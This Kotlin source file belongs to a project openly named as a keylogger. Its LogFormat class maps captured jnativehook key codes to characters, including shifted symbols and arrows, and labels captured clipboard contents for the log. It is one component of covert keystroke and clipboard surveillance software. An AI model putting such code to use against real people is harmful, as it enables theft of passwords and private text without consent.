package com.github.secretx33.keylogger

import org.jnativehook.keyboard.NativeKeyEvent

class LogFormat {

    fun formatKey(
        keyCode: Int,
        rawKeyCode: Int,
        isShiftPressed: Boolean,
    ): String {
        val keyText = when  {
            isShiftPressed && keyCode == NativeKeyEvent.VC_1 -> "!"
            isShiftPressed && keyCode == NativeKeyEvent.VC_2 -> "@"
            isShiftPressed && keyCode == NativeKeyEvent.VC_3 -> "#"
            isShiftPressed && keyCode == NativeKeyEvent.VC_4 -> "$"
            isShiftPressed && keyCode == NativeKeyEvent.VC_5 -> "%"
            isShiftPressed && keyCode == NativeKeyEvent.VC_6 -> "^"
            isShiftPressed && keyCode == NativeKeyEvent.VC_7 -> "&"
            isShiftPressed && keyCode == NativeKeyEvent.VC_8 -> "*"
            isShiftPressed && keyCode == NativeKeyEvent.VC_9 -> "("
            isShiftPressed && keyCode == NativeKeyEvent.VC_0 -> ")"
            isShiftPressed && keyCode == NativeKeyEvent.VC_MINUS -> "_"
            isShiftPressed && keyCode == NativeKeyEvent.VC_EQUALS -> "+"
            isShiftPressed && keyCode == NativeKeyEvent.VC_BACK_SLASH -> "|"
            isShiftPressed && keyCode == NativeKeyEvent.VC_OPEN_BRACKET -> "{"
            isShiftPressed && keyCode == NativeKeyEvent.VC_CLOSE_BRACKET -> "}"
            isShiftPressed && keyCode == NativeKeyEvent.VC_SEMICOLON -> ":"
            isShiftPressed && keyCode == NativeKeyEvent.VC_COMMA -> "<"
            isShiftPressed && keyCode == NativeKeyEvent.VC_PERIOD -> ">"
            isShiftPressed && keyCode == NativeKeyEvent.VC_SLASH -> "?"
            keyCode == NativeKeyEvent.VC_MINUS || rawKeyCode == 109 -> "-"
            keyCode == NativeKeyEvent.VC_EQUALS -> "="
            keyCode == NativeKeyEvent.VC_BACK_SLASH -> "\\"
            keyCode == NativeKeyEvent.VC_OPEN_BRACKET -> "["
            keyCode == NativeKeyEvent.VC_CLOSE_BRACKET -> "]"
            keyCode == NativeKeyEvent.VC_SEMICOLON -> ";"
            keyCode == NativeKeyEvent.VC_COMMA -> ","
            keyCode == NativeKeyEvent.VC_PERIOD -> "."
            keyCode == NativeKeyEvent.VC_SLASH -> "/"
            keyCode == NativeKeyEvent.VC_QUOTE -> "\""
            keyCode == NativeKeyEvent.VC_UP -> "↑"
            keyCode == NativeKeyEvent.VC_DOWN -> "↓"
            keyCode == NativeKeyEvent.VC_LEFT -> "←"
            keyCode == NativeKeyEvent.VC_RIGHT -> "→"
            keyCode == 83 -> "."
            rawKeyCode == 106 -> "*"
            rawKeyCode == 107 -> "+"
            rawKeyCode == 161 -> "Shift"
            keyCode == NativeKeyEvent.VC_SPACE -> " "
            else -> NativeKeyEvent.getKeyText(keyCode)
        }

        return when {
            keyText.startsWith("Unknown") -> {
                println("Key '$keyCode' is not mapped, saving its code instead!")
                "[${keyCode}]"
            }
            keyText.length > 1 || keyText.matches(NON_ASCII_REGEX) -> "[$keyText]"
            isShiftPressed -> keyText.uppercase()
            else -> keyText.lowercase()
        }
    }

    fun formatClipboard(clipboardText: String): String = "\nCopied Text: '$clipboardText'"

    private companion object {
        val NON_ASCII_REGEX = """[^\x20-\x7F\xA1-\xFF]""".toRegex()
    }
}